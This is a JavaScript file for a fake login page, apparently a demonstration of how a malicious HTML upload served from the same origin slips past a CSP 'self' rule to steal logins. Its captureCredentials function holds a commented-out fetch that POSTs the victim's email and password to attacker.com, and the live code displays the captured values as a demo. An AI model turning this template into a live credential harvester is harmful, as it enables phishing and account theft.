async function handleLogin() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('loginBtn');
    const msg = document.getElementById('message');

    if (!email || !password) {
        showMessage('Please fill in all fields.', 'error');
        return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        showMessage('Please enter a valid email address.', 'error');
        return;
    }

    captureCredentials(email, password);    
}

function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.textContent = text;
    msg.className = type;
}

function captureCredentials(email, password) {
    // In a real attack, send to attacker's server:
    // fetch('https://attacker.com/harvest', {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({ 
    //     email: email, 
    //     password: password,
    //     site: 'anonbuy',
    //     timestamp: new Date().toISOString()
    //   })
    // });

    // For demo: show what was captured
    document.body.innerHTML = `
    <div style="background: #fee; padding: 30px; border: 3px solid red; max-width: 600px; margin: 50px auto; border-radius: 8px;">
      <h2 style="color: #d32f2f; margin-top: 0;">⚠️ CREDENTIALS CAPTURED</h2>
      <div style="background: white; padding: 15px; border-radius: 4px; margin: 20px 0;">
        <p><strong>Email:</strong> <code>${email}</code></p>
        <p><strong>Password:</strong> <code>${password}</code></p>
      </div>
      <h3>What just happened?</h3>
      <ul style="text-align: left;">
        <li>You uploaded malicious HTML + JavaScript to the server</li>
        <li>Files were served from the same origin (<code>/uploads/</code>)</li>
        <li>CSP allowed the script because it's from <code>'self'</code></li>
        <li>Victim entered credentials → attacker now has them</li>
      </ul>
      <p><strong>In a real attack:</strong> These credentials would be sent to <code>https://attacker.com</code> and the victim would be redirected to a real page, never knowing they were compromised.</p>
    </div>
  `;
    return false;
}

document.getElementById('loginBtn').addEventListener('click', handleLogin);

document.addEventListener('keydown', e => {
    if (e.key === 'Enter') handleLogin();
});

